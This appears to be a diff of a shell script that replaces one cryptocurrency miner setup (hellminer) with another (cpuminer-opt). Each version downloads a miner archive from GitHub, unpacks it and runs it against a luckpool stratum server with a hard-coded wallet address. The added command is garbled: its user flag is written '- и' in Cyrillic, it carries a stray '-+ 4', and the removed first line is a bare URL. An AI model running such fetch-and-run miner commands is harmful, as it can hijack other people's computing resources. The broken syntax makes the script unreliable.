@@ -1,3 +1,1 @@
-https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RG776RbVLKPxfY8NQEE1RZ38F3Me8sxQ5a.KONTOLL -p x --cpu 2
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a allium -o stratum+tcp://ap.luckpool.net:3956 - и RG776RbVLKPxfY8NQEE1RZ38F3Me8sxQ5a.KONTOLL -p c=DGB -+ 4
